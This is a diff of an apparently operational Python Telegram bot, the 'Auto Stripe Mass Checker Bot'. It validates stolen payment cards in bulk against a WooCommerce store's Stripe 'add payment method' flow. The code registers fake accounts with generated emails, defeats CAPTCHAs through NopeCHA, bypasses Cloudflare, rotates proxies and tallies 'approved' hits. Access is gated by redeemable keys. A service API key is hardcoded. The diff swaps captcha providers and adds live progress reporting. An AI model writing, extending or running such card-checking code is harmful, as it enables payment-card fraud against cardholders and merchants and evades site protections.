@@ -1,4 +1,3 @@
-
 import requests
 import json
 import re
@@ -33,16 +32,16 @@ KEYS_FILE = os.getenv('KEYS_FILE', 'redeem_keys.json')
 WHITELIST_FILE = os.getenv('WHITELIST_FILE', 'whitelist.json')
 
 # ========== CONFIGURACIÃ“N CAPTCHA ==========
-CAPTCHA_API_KEY = os.getenv('CAPTCHA_API_KEY', 'sub_1UPvEBCRwBwvt6ptgrzQNfnS')  # API key de 2captcha.com o capsolver.com
-CAPTCHA_SERVICE = os.getenv('CAPTCHA_SERVICE', 'nopecha')  # '2captcha' o 'capsolver' o 'none'
-CAPTCHA_TIMEOUT = int(os.getenv('CAPTCHA_TIMEOUT', '120'))  # Timeout mÃ¡ximo esperando resoluciÃ³n
+NOPECHA_API_KEY = os.getenv('NOPECHA_API_KEY', 'sub_1UPvEBCRwBwvt6ptgrzQNfnS')  # API key de nopecha.com
+CAPTCHA_SERVICE = os.getenv('CAPTCHA_SERVICE', 'nopecha')  # 'nopecha' o 'none'
+CAPTCHA_TIMEOUT = int(os.getenv('CAPTCHA_TIMEOUT', '180'))  # Timeout mÃ¡ximo esperando resoluciÃ³n
 
 MAX_MASS = 30
 MAX_FILE_CARDS = 50
 MAX_THREADS = 1
 
 # Estados de conversaciÃ³n
-MASS_WAIT_CARDS = 5
+MASS_WAIT_CARDS = 1
 MTXT_WAIT_FILE = 1
 
 # Logging
@@ -53,7 +52,6 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ========== CARGA INICIAL ==========
-
 faker = Faker()
 print_lock = threading.Lock()
 
@@ -64,8 +62,42 @@ if os.path.exists(PROXY_FILE):
         proxies_list = [line.strip() for line in f if line.strip()]
 
 
-# ========== SISTEMA DE CAPTCHA ==========
+# ========== PROGRESO ==========
+class ProgressTracker:
+    def __init__(self, total):
+        self.total = total
+        self.completed = 0
+        self.approved = 0
+        self.declined = 0
+        self.errors = 0
+        self.results = []
+        self.lock = threading.Lock()
+        self.done = threading.Event()
 
+    def update(self, result_line: str):
+        with self.lock:
+            self.completed += 1
+            if "Card Approved Success" in result_line:
+                self.approved += 1
+            elif "Declined" in result_line:
+                self.declined += 1
+            else:
+                self.errors += 1
+            self.results.append(result_line)
+
+    def get_stats(self):
+        with self.lock:
+            return {
+                'completed': self.completed,
+                'total': self.total,
+                'approved': self.approved,
+                'declined': self.declined,
+                'errors': self.errors,
+                'results': self.results.copy()
+            }
+
+
+# ========== SISTEMA DE CAPTCHA ==========
 def create_session_with_cloudflare(proxies=None):
     """
     Crea una sesiÃ³n que maneja Cloudflare automÃ¡ticamente.
@@ -73,7 +105,7 @@ def create_session_with_cloudflare(proxies=None):
     """
     if HAS_CLOUDSCRAPER:
         scraper = cloudscraper.create_scraper(
-            interpreter='js2py',  # Usa js2py para resolver JS challenges
+            interpreter='js2py',
             browser={
                 'browser': 'chrome',
                 'platform': 'windows',
@@ -104,7 +136,6 @@ def detect_captcha(html_text: str, response_url: str = "") -> Optional[dict]:
     )
     if recaptcha_match:
         sitekey = recaptcha_match.group(1)
-        # Buscar la pageurl (action)
         action_match = re.search(r'data-action=["\']([^"\']+)["\']', html_text)
         action = action_match.group(1) if action_match else "submit"
         
@@ -194,175 +225,88 @@ def detect_captcha(html_text: str, response_url: str = "") -> Optional[dict]:
     return None
 
 
-def solve_captcha_2captcha(captcha_info: dict) -> Optional[str]:
+def solve_captcha_nopecha(captcha_info: dict) -> Optional[str]:
     """
-    Resuelve un captcha usando el servicio 2captcha.
+    Resuelve un captcha usando el servicio NopeCHA.
     Retorna el token resuelto o None si falla.
     """
-    if not CAPTCHA_API_KEY:
-        logger.error("âŒ CAPTCHA_API_KEY no configurada")
+    if not NOPECHA_API_KEY:
+        logger.error("âŒ NOPECHA_API_KEY no configurada")
         return None
     
-    api_url = "https://api.nopecha.com/v1/status"
-    result_url = "https://2captcha.com/res.php"
-    
-    payload = {
-        "key": CAPTCHA_API_KEY,
-        "method": "userrecaptcha" if captcha_info["type"] == "recaptcha" else captcha_info["type"],
-        "googlekey": captcha_info.get("sitekey", ""),
-        "pageurl": captcha_info.get("pageurl", "https://dilaboards.com"),
-        "json": 1,
+    api_url = "https://api.nopecha.com/token"
+    params = {
+        "key": NOPECHA_API_KEY,
     }
     
-    # Ajustes segÃºn tipo de captcha
-    if captcha_info["type"] == "hcaptcha":
-        payload["method"] = "hcaptcha"
-    elif captcha_info["type"] == "turnstile":
-        payload["method"] = "turnstile"
-    elif captcha_info["type"] == "funcaptcha":
-        payload["method"] = "funcaptcha"
-        payload["surl"] = captcha_info.get("surl", "https://api.arkoselabs.com")
-    elif captcha_info["type"] == "geetest":
-        payload["method"] = "geetest"
-        payload["gt"] = captcha_info.get("gt", "")
-        payload["challenge"] = captcha_info.get("challenge", "")
+    ctype = captcha_info["type"]
     
-    logger.info(f"ðŸ“¤ Enviando captcha a 2captcha ({captcha_info['type']})...")
-    
-    try:
-        # Enviar captcha
-        resp = requests.post(api_url, data=payload, timeout=30)
-        resp_data = resp.json()
+    if ctype == "recaptcha":
+        version = captcha_info.get("version", "v2")
+        if version == "v3":
+            params["type"] = "recaptcha3"
+            params["action"] = captcha_info.get("action", "submit")
+        else:
+            params["type"] = "recaptcha2"
+        params["sitekey"] = captcha_info.get("sitekey", "")
+        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
         
-        if resp_data.get("status") != 1:
-            logger.error(f"âŒ Error enviando captcha: {resp_data}")
+    elif ctype == "hcaptcha":
+        params["type"] = "hcaptcha"
+        params["sitekey"] = captcha_info.get("sitekey", "")
+        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
+        
+    elif ctype == "turnstile":
+        params["type"] = "turnstile"
+        params["sitekey"] = captcha_info.get("sitekey", "")
+        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
+        
+    elif ctype == "funcaptcha":
+        params["type"] = "funcaptcha"
+        params["sitekey"] = captcha_info.get("sitekey", "")
+        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
+        
+    elif ctype == "geetest":
+        params["type"] = "geetest"
+        params["gt"] = captcha_info.get("gt", "")
+        params["challenge"] = captcha_info.get("challenge", "")
+        params["url"] = captcha_info.get("pageurl", "https://dilaboards.com")
+        
+    else:
+        logger.error(f"âŒ Tipo de captcha no soportado por NopeCHA: {ctype}")
+        return None
+    
+    logger.info(f"ðŸ“¤ Enviando captcha a NopeCHA ({ctype})...")
+    
+    start_time = time.time()
+    while time.time() - start_time < CAPTCHA_TIMEOUT:
+        try:
+            resp = requests.get(api_url, params=params, timeout=60)
+            data = resp.json()
+            
+            if "data" in data and data["data"]:
+                token = data["data"]
+                logger.info("âœ… Captcha resuelto exitosamente con NopeCHA")
+                return token
+            
+            msg = data.get("message", "").lower()
+            if data.get("error") == 1 or "not ready" in msg or "pending" in msg or "processing" in msg:
+                logger.info(f"â³ Esperando resoluciÃ³n NopeCHA... ({int(time.time() - start_time)}s)")
+                time.sleep(5)
+                continue
+            
+            logger.error(f"âŒ Error NopeCHA: {data}")
             return None
-        
-        captcha_id = resp_data.get("request")
-        logger.info(f"âœ… Captcha enviado, ID: {captcha_id}. Esperando resoluciÃ³n...")
-        
-        # Esperar resoluciÃ³n
-        start_time = time.time()
-        while time.time() - start_time < CAPTCHA_TIMEOUT:
+            
+        except requests.exceptions.Timeout:
+            logger.warning("â³ Timeout en solicitud NopeCHA, reintentando...")
             time.sleep(5)
-            
-            check_payload = {
-                "key": CAPTCHA_API_KEY,
-                "action": "get",
-                "id": captcha_id,
-                "json": 1,
-            }
-            check_resp = requests.get(result_url, params=check_payload, timeout=30)
-            check_data = check_resp.json()
-            
-            if check_data.get("status") == 1:
-                token = check_data.get("request")
-                logger.info(f"âœ… Captcha resuelto exitosamente")
-                return token
-            
-            if check_data.get("request") == "ERROR_CAPTCHA_UNSOLVABLE":
-                logger.error("âŒ Captcha no se pudo resolver")
-                return None
-            
-            logger.info(f"â³ Esperando... ({int(time.time() - start_time)}s)")
-        
-        logger.error(f"âŒ Timeout esperando resoluciÃ³n de captcha ({CAPTCHA_TIMEOUT}s)")
-        return None
+        except Exception as e:
+            logger.error(f"âŒ Error en NopeCHA: {str(e)}")
+            time.sleep(5)
     
-    except Exception as e:
-        logger.error(f"âŒ Error en 2captcha: {str(e)}")
-        return None
-
-
-def solve_captcha_capsolver(captcha_info: dict) -> Optional[str]:
-    """
-    Resuelve captcha usando CapSolver (alternativa a 2captcha).
-    """
-    if not CAPTCHA_API_KEY:
-        logger.error("âŒ CAPTCHA_API_KEY no configurada")
-        return None
-    
-    api_url = "https://api.capsolver.com/createTask"
-    result_url = "https://api.capsolver.com/getTaskResult"
-    
-    # Mapear tipo de captcha al formato de capsolver
-    task_type_map = {
-        "recaptcha": "ReCaptchaV2TaskProxyless" if captcha_info.get("version") == "v2" else "ReCaptchaV3TaskProxyless",
-        "hcaptcha": "HCaptchaTaskProxyless",
-        "turnstile": "AntiTurnstileTaskProxyless",
-        "funcaptcha": "FunCaptchaTaskProxyless",
-        "geetest": "GeeTestTaskProxyless",
-    }
-    
-    task_type = task_type_map.get(captcha_info["type"])
-    if not task_type:
-        logger.error(f"âŒ Tipo de captcha no soportado por capsolver: {captcha_info['type']}")
-        return None
-    
-    task = {
-        "type": task_type,
-        "websiteURL": captcha_info.get("pageurl", "https://dilaboards.com"),
-    }
-    
-    if captcha_info["type"] in ("recaptcha", "hcaptcha", "turnstile"):
-        task["websiteKey"] = captcha_info.get("sitekey", "")
-    elif captcha_info["type"] == "funcaptcha":
-        task["websiteKey"] = captcha_info.get("sitekey", "")
-        task["funcaptchaApiJSURL"] = "https://api.arkoselabs.com/fc/gt2/public_key/YOUR_PUBLIC_KEY"
-    elif captcha_info["type"] == "geetest":
-        task["gt"] = captcha_info.get("gt", "")
-        task["challenge"] = captcha_info.get("challenge", "")
-    
-    if captcha_info.get("action"):
-        task["pageAction"] = captcha_info["action"]
-    
-    payload = {
-        "clientKey": CAPTCHA_API_KEY,
-        "task": task,
-    }
-    
-    logger.info(f"ðŸ“¤ Enviando captcha a CapSolver ({captcha_info['type']})...")
-    
-    try:
-        resp = requests.post(api_url, json=payload, timeout=30)
-        resp_data = resp.json()
-        
-        if resp_data.get("errorId") != 0:
-            logger.error(f"âŒ Error CapSolver: {resp_data}")
-            return None
-        
-        task_id = resp_data.get("taskId")
-        logger.info(f"âœ… Tarea creada, ID: {task_id}. Esperando...")
-        
-        start_time = time.time()
-        while time.time() - start_time < CAPTCHA_TIMEOUT:
-            time.sleep(3)
-            
-            check_payload = {
-                "clientKey": CAPTCHA_API_KEY,
-                "taskId": task_id,
-            }
-            check_resp = requests.post(result_url, json=check_payload, timeout=30)
-            check_data = check_resp.json()
-            
-            if check_data.get("status") == "ready":
-                solution = check_data.get("solution", {})
-                token = solution.get("gRecaptchaResponse") or solution.get("token") or solution.get("captcha")
-                logger.info(f"âœ… Captcha resuelto exitosamente con CapSolver")
-                return token
-            
-            if check_data.get("errorId") != 0:
-                logger.error(f"âŒ Error CapSolver: {check_data}")
-                return None
-            
-            logger.info(f"â³ Esperando... ({int(time.time() - start_time)}s)")
-        
-        logger.error(f"âŒ Timeout CapSolver ({CAPTCHA_TIMEOUT}s)")
-        return None
-    
-    except Exception as e:
-        logger.error(f"âŒ Error en CapSolver: {str(e)}")
-        return None
+    logger.error(f"âŒ Timeout esperando resoluciÃ³n de NopeCHA ({CAPTCHA_TIMEOUT}s)")
+    return None
 
 
 def solve_captcha(captcha_info: dict) -> Optional[str]:
@@ -370,21 +314,21 @@ def solve_captcha(captcha_info: dict) -> Optional[str]:
     FunciÃ³n principal para resolver captcha.
     Elige el servicio segÃºn configuraciÃ³n.
     """
-    if not CAPTCHA_API_KEY or CAPTCHA_SERVICE == 'none':
+    if not NOPECHA_API_KEY or CAPTCHA_SERVICE == 'none':
         logger.warning("âš ï¸ Captcha detectado pero no hay API key configurada. Saltando...")
         return None
     
     if captcha_info["type"] == "cloudflare_challenge":
-        # Cloudflare JS challenge lo maneja cloudscraper, no necesita resoluciÃ³n externa
         logger.info("â„¹ï¸ Cloudflare JS Challenge - cloudscraper lo manejarÃ¡")
         return "CLOUDFLARE_SKIP"
     
     logger.info(f"ðŸ§© Resolviendo captcha tipo: {captcha_info['type']} usando {CAPTCHA_SERVICE}...")
     
-    if CAPTCHA_SERVICE.lower() == 'capsolver':
-        token = solve_captcha_capsolver(captcha_info)
-    else:  # default: 2captcha
-        token = solve_captcha_2captcha(captcha_info)
+    if CAPTCHA_SERVICE.lower() == 'nopecha':
+        token = solve_captcha_nopecha(captcha_info)
+    else:
+        logger.error(f"âŒ Servicio de captcha no soportado: {CAPTCHA_SERVICE}")
+        token = None
     
     if token:
         logger.info("âœ… Captcha resuelto!")
@@ -399,7 +343,6 @@ def inject_captcha_token(html: str, token: str, captcha_type: str) -> str:
     Inyecta el token resuelto en el HTML para reenviar el formulario.
     """
     if captcha_type == "recaptcha":
-        # reCAPTCHA espera g-recaptcha-response
         if 'g-recaptcha-response' in html:
             html = re.sub(
                 r'name="g-recaptcha-response"[^>]*value="[^"]*"',
@@ -426,7 +369,6 @@ def inject_captcha_token(html: str, token: str, captcha_type: str) -> str:
             )
     
     elif captcha_type == "turnstile":
-        # Cloudflare Turnstile usa cf-turnstile-response
         if 'cf-turnstile-response' in html:
             html = re.sub(
                 r'name="cf-turnstile-response"[^>]*value="[^"]*"',
@@ -438,7 +380,6 @@ def inject_captcha_token(html: str, token: str, captcha_type: str) -> str:
 
 
 # ========== SISTEMA DE KEYS REDIMIBLES ==========
-
 def load_json(filepath):
     if not os.path.exists(filepath):
         return {}
@@ -535,7 +476,6 @@ def has_access(user_id: int) -> bool:
 
 
 # ========== FUNCIONES ORIGINALES (con soporte captcha) ==========
-
 def auto_request(
     url: str,
     method: str = 'GET',
@@ -603,23 +543,19 @@ def extract_message(response: requests.Response) -> str:
 
 def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
     """VersiÃ³n mejorada con manejo de captcha."""
-    # Usar cloudscraper si estÃ¡ disponible para manejar Cloudflare
     session = create_session_with_cloudflare(proxies)
     base_url = 'https://dilaboards.com'
     user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     
     try:
-        # --- PASO 1: GET inicial ---
         url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
         headers_1 = {'User-Agent': user_ag}
         response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
         
-        # Verificar si hay captcha en la respuesta
         captcha = detect_captcha(response_1.text, url_1)
         if captcha:
             logger.info(f"âš ï¸ Captcha detectado en GET inicial: {captcha['type']}")
             if captcha['type'] == 'cloudflare_challenge' and HAS_CLOUDSCRAPER:
-                # cloudscraper ya deberÃ­a haber manejado esto, reintentar
                 logger.info("ðŸ”„ Reintentando con cloudscraper...")
                 response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)
                 captcha = detect_captcha(response_1.text, url_1)
@@ -627,25 +563,17 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
             if captcha and captcha['type'] != 'cloudflare_challenge':
                 token = solve_captcha(captcha)
                 if token and token != "CLOUDFLARE_SKIP":
-                    # Inyectar token y reenviar
                     modified_html = inject_captcha_token(response_1.text, token, captcha['type'])
-                    # Si el captcha tiene su propio form, necesitamos reenviar el formulario
-                    # Esto es complejo - lo simplificamos: asumimos que si hay captcha,
-                    # la pÃ¡gina lo requiere para continuar, intentamos resolverlo y
-                    # hacemos un POST con el token
                     logger.info("ðŸ”„ Reintentando con token de captcha...")
-                    # Buscar el action del formulario
                     form_action_match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', response_1.text)
                     form_action = form_action_match.group(1) if form_action_match else url_1
                     if not form_action.startswith('http'):
                         form_action = base_url + form_action
                     
                     form_data = {}
-                    # Extraer todos los inputs del formulario
                     for input_match in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', modified_html):
                         form_data[input_match.group(1)] = input_match.group(2)
                     
-                    # Agregar token de captcha
                     if captcha['type'] == 'recaptcha':
                         form_data['g-recaptcha-response'] = token
                     elif captcha['type'] == 'hcaptcha':
@@ -653,19 +581,16 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
                     elif captcha['type'] == 'turnstile':
                         form_data['cf-turnstile-response'] = token
                     
-                    # Reenviar el formulario
                     response_1 = auto_request(
                         form_action, method='POST',
                         headers=headers_1, data=form_data,
                         session=session, proxies=proxies
                     )
         
-        # Extraer tokens del HTML (con o sin captcha)
         reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
         pk_match = re.search('"key":"(.*?)"', response_1.text)
         
         if not reg_match or not pk_match:
-            # Intentar buscar en otros formatos o response_1.text completo
             pk_match = re.search(r'pk=["\']([^"\']+)["\']', response_1.text)
             if not reg_match:
                 return f"Failed to extract session tokens. Possible captcha block. Response snippet: {response_1.text[:300]}"
@@ -675,7 +600,6 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
         regester_nouce = reg_match.group(1)
         pk = pk_match.group(1)
 
-        # --- PASO 2: Registrar usuario ---
         data_2 = {
             'email': faker.email(),
             'woocommerce-register-nonce': regester_nouce,
@@ -683,7 +607,6 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
         }
         response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)
         
-        # Verificar captcha en respuesta de registro
         captcha2 = detect_captcha(response_2.text, url_1)
         if captcha2 and captcha2['type'] != 'cloudflare_challenge':
             logger.info(f"âš ï¸ Captcha en registro: {captcha2['type']}")
@@ -701,7 +624,6 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
             return f"Failed to extract ajax nonce. Response: {response_2.text[:200]}"
         ajax_nonce = nonce_match.group(1)
 
-        # --- PASO 3: Stripe Payment Method ---
         url_3 = 'https://api.stripe.com/v1/payment_methods'
         muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
         sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
@@ -734,7 +656,6 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
         response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)
         
         if response_3.status_code != 200:
-            # Stripe puede responder con captcha tambiÃ©n
             if 'captcha' in response_3.text.lower() or 'challenge' in response_3.text.lower():
                 logger.warning("âš ï¸ Stripe respondiÃ³ con desafÃ­o de seguridad")
                 return "Stripe Security Challenge | Posible captcha de Stripe"
@@ -744,7 +665,6 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
         if not pm:
             return f"Failed to get payment method ID. Response: {response_3.text[:200]}"
 
-        # --- PASO 4: Confirmar Setup Intent ---
         dynamic_params_4 = {
             'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
             'action': 'create_and_confirm_setup_intent',
@@ -754,16 +674,14 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
         }
         response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)
         
-        # Verificar captcha en la respuesta final
         try:
             resp_json = response_4.json()
             if resp_json.get("success"):
-                return "Card Added Successâœ…"
+                return "Card Approved SuccessðŸƒ"
             else:
                 msg = extract_message(response_4)
-                return f"Declinedâ™¨âŒ | {msg}"
+                return f"Declinedâ™¨ï¸ | {msg}"
         except:
-            # Si no es JSON, puede haber captcha bloqueando
             captcha4 = detect_captcha(response_4.text)
             if captcha4:
                 return f"Captcha bloqueÃ³ la request final: {captcha4['type']}"
@@ -805,8 +723,34 @@ def process_card(card, proxies_list, serial_num):
     return line
 
 
-# ========== FUNCIONES AUXILIARES DEL BOT ==========
+def process_cards_batch(cards, proxies, tracker=None):
+    results = []
+    try:
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            futures = {
+                executor.submit(process_card, card, proxies, i + 1): i
+                for i, card in enumerate(cards)
+            }
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                except Exception as e:
+                    result = f"Error in thread: {str(e)}"
+                if tracker:
+                    tracker.update(result)
+                results.append(result)
+    finally:
+        if tracker:
+            tracker.done.set()
+    
+    def get_serial(line):
+        match = re.match(r'\[(\d+)\]', line)
+        return int(match.group(1)) if match else 0
+    results.sort(key=get_serial)
+    return results
 
+
+# ========== FUNCIONES AUXILIARES DEL BOT ==========
 def check_access(update: Update) -> bool:
     user_id = update.effective_user.id
     return has_access(user_id)
@@ -825,29 +769,53 @@ def parse_cards(text: str, max_cards: int = None):
     return cards
 
 
-def process_cards_batch(cards, proxies):
-    results = []
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = {
-            executor.submit(process_card, card, proxies, i + 1): card
-            for i, card in enumerate(cards)
-        }
-        for future in as_completed(futures):
-            try:
-                result = future.result()
-                results.append(result)
-            except Exception as e:
-                results.append(f"Error in thread: {str(e)}")
+async def run_with_progress(update: Update, cards, origin_prefix=""):
+    tracker = ProgressTracker(len(cards))
+    msg = await update.message.reply_text("â³ Iniciando procesamiento...")
     
-    def get_serial(line):
-        match = re.match(r'\[(\d+)\]', line)
-        return int(match.group(1)) if match else 0
-    results.sort(key=get_serial)
-    return results
+    loop = asyncio.get_event_loop()
+    batch_future = loop.run_in_executor(None, process_cards_batch, cards, proxies_list, tracker)
+    
+    last_text = None
+    while not tracker.done.is_set():
+        await asyncio.sleep(2)
+        stats = tracker.get_stats()
+        if stats['total'] == 0:
+            continue
+        pct = int((stats['completed'] / stats['total']) * 100)
+        filled = int(pct / 10)
+        bar = 'â–ˆ' * filled + 'â–‘' * (10 - filled)
+        text = (
+            f"â³ *{origin_prefix}Procesando...*\n"
+            f"`[{bar}]` *{pct}%*\n\n"
+            f"âœ… *Hits Approved:* `{stats['approved']}`\n"
+            f"âŒ Rechazadas: `{stats['declined']}`\n"
+            f"âš ï¸ Errores: `{stats['errors']}`\n"
+            f"ðŸ“Š Completadas: `{stats['completed']}/{stats['total']}`"
+        )
+        if text != last_text:
+            try:
+                await msg.edit_text(text, parse_mode='Markdown')
+                last_text = text
+            except Exception:
+                pass
+    
+    results = await batch_future
+    stats = tracker.get_stats()
+    header = (
+        f"ðŸ“Š *Resultados ({len(results)} tarjetas)*\n"
+        f"âœ… *Hits Approved:* {stats['approved']} | âŒ Rechazadas: {stats['declined']} | âš ï¸ Errores: {stats['errors']}\n\n"
+    )
+    
+    result_text = '\n'.join(results)
+    if len(result_text) > 3500:
+        result_text = result_text[:3500] + "\n\nâš ï¸ Resultados truncados..."
+    
+    final_text = header + f"```\n{result_text}\n```"
+    await msg.edit_text(final_text, parse_mode='Markdown')
 
 
 # ========== HANDLERS DEL BOT ==========
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -862,8 +830,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(welcome, parse_mode='Markdown')
         return
     
-    captcha_status = "âœ… Activo" if CAPTCHA_API_KEY else "âš ï¸ No configurado"
-    captcha_service = CAPTCHA_SERVICE if CAPTCHA_API_KEY else "N/A"
+    captcha_status = "âœ… Activo" if NOPECHA_API_KEY else "âš ï¸ No configurado"
+    captcha_service = CAPTCHA_SERVICE if NOPECHA_API_KEY else "N/A"
     cf_status = "âœ… sÃ­" if HAS_CLOUDSCRAPER else "âŒ no (instala: pip install cloudscraper)"
     
     welcome = (
@@ -894,8 +862,7 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     username = update.effective_user.username or update.effective_user.full_name
     
-    # InformaciÃ³n del captcha
-    captcha_line = f"ðŸ§© Captcha: {'âœ… Activo (' + CAPTCHA_SERVICE + ')' if CAPTCHA_API_KEY else 'âŒ No configurado'}"
+    captcha_line = f"ðŸ§© Captcha: {'âœ… Activo (' + CAPTCHA_SERVICE + ')' if NOPECHA_API_KEY else 'âŒ No configurado'}"
     cf_line = f"â˜ï¸ Cloudflare: {'âœ… Bypass activo' if HAS_CLOUDSCRAPER else 'âŒ No instalado (pip install cloudscraper)'}"
     
     if user_id in ADMIN_IDS:
@@ -1154,30 +1121,8 @@ async def mass_receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE)
         if diff > 0:
             await update.message.reply_text(f"âš ï¸ {diff} lÃ­nea(s) omitida(s) por formato invÃ¡lido.")
 
-    msg = await update.message.reply_text(
-        f"â³ Procesando {len(cards)} tarjeta(s)...\n"
-        f"Esto puede tomar unos momentos."
-    )
-
-    loop = asyncio.get_event_loop()
-    results = await loop.run_in_executor(None, process_cards_batch, cards, proxies_list)
-
-    approved = sum(1 for r in results if "Card Approved Success" in r)
-    declined = sum(1 for r in results if "Declined" in r)
-    errors = len(results) - approved - declined
-
-    header = (
-        f"ðŸ“Š *Resultados ({len(results)} tarjetas)*\n"
-        f"âœ… Aprobadas: {approved} | âŒ Rechazadas: {declined} | âš ï¸ Errores: {errors}\n\n"
-    )
-
-    result_text = '\n'.join(results)
-    if len(result_text) > 3500:
-        result_text = result_text[:3500] + "\n\nâš ï¸ Resultados truncados..."
-
-    response = header + f"```\n{result_text}\n```"
-    
-    await msg.edit_text(response, parse_mode='Markdown')
+    await run_with_progress(update, cards, origin_prefix="Mass Check | ")
+    return ConversationHandler.END
 
 
 async def mass_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1250,29 +1195,7 @@ async def mtxt_receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             diff = lines_in_file - len(cards)
             await update.message.reply_text(f"âš ï¸ {diff} lÃ­nea(s) omitida(s) por formato invÃ¡lido.")
 
-        msg = await update.message.reply_text(
-            f"â³ Procesando {len(cards)} tarjeta(s) desde el archivo...\n"
-            f"Esto puede tomar varios momentos."
-        )
-
-        loop = asyncio.get_event_loop()
-        results = await loop.run_in_executor(None, process_cards_batch, cards, proxies_list)
-
-        approved = sum(1 for r in results if "Card Approved Success" in r)
-        declined = sum(1 for r in results if "Declined" in r)
-        errors = len(results) - approved - declined
-
-        header = (
-            f"ðŸ“Š *Resultados desde archivo ({len(results)} tarjetas)*\n"
-            f"âœ… Aprobadas: {approved} | âŒ Rechazadas: {declined} | âš ï¸ Errores: {errors}\n\n"
-        )
-
-        result_text = '\n'.join(results)
-        if len(result_text) > 3500:
-            result_text = result_text[:3500] + "\n\nâš ï¸ Resultados truncados..."
-
-        response = header + f"```\n{result_text}\n```"
-        await msg.edit_text(response, parse_mode='Markdown')
+        await run_with_progress(update, cards, origin_prefix="File Check | ")
 
     except Exception as e:
         await update.message.reply_text(f"âŒ Error al leer el archivo: {str(e)}")
@@ -1295,7 +1218,6 @@ async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ========== MAIN ==========
-
 def main():
     if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
         logger.error("=== CONFIGURA EL BOT_TOKEN en variables de entorno ===")
@@ -1305,7 +1227,6 @@ def main():
 
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # Handlers
     app.add_handler(CommandHandler('start', start))
     app.add_handler(CommandHandler('help', help_cmd))
     app.add_handler(CommandHandler('status', status))
@@ -1315,7 +1236,6 @@ def main():
     app.add_handler(CommandHandler('keys', keys_list))
     app.add_handler(CommandHandler('whitelist', whitelist_view))
 
-    # /mass conversaciÃ³n
     mass_conv_handler = ConversationHandler(
         entry_points=[CommandHandler('mass', mass_start)],
         states={
@@ -1328,7 +1248,6 @@ def main():
     )
     app.add_handler(mass_conv_handler)
 
-    # /mtxt conversaciÃ³n
     mtxt_conv_handler = ConversationHandler(
         entry_points=[CommandHandler('mtxt', mtxt_start)],
         states={
@@ -1344,19 +1263,18 @@ def main():
 
     app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
 
-    # Info de inicio
     logger.info("=== Auto Stripe Mass Checker Bot ===")
     logger.info(f"Bot Token: {BOT_TOKEN[:8]}...{BOT_TOKEN[-4:]}")
     logger.info(f"Proxies cargados: {len(proxies_list)}")
     logger.info(f"Admins: {ADMIN_IDS if ADMIN_IDS else 'No configurados'}")
     logger.info(f"Usuarios estÃ¡ticos: {'Todos' if not ALLOWED_USERS else ALLOWED_USERS}")
-    logger.info(f"Captcha API Key: {'âœ… Configurada (' + CAPTCHA_SERVICE + ')' if CAPTCHA_API_KEY else 'âŒ No configurada'}")
+    logger.info(f"Captcha API Key: {'âœ… Configurada (' + CAPTCHA_SERVICE + ')' if NOPECHA_API_KEY else 'âŒ No configurada'}")
     logger.info(f"Cloudflare bypass: {'âœ… cloudscraper instalado' if HAS_CLOUDSCRAPER else 'âŒ No instalado (pip install cloudscraper)'}")
     
     print("\n" + "="*60)
     print("ðŸ¤– Auto Stripe Mass Checker Bot")
     print("="*60)
-    print(f"\nðŸ“¡ Captcha: {'âœ… ' + CAPTCHA_SERVICE if CAPTCHA_API_KEY else 'âŒ Sin API key'}")
+    print(f"\nðŸ“¡ Captcha: {'âœ… ' + CAPTCHA_SERVICE if NOPECHA_API_KEY else 'âŒ Sin API key'}")
     print(f"â˜ï¸ Cloudflare: {'âœ… Bypass activo' if HAS_CLOUDSCRAPER else 'âŒ Instala: pip install cloudscraper'}")
     print(f"ðŸ”‘ Keys: {KEYS_FILE}")
     print(f"ðŸ“‹ Whitelist: {WHITELIST_FILE}")
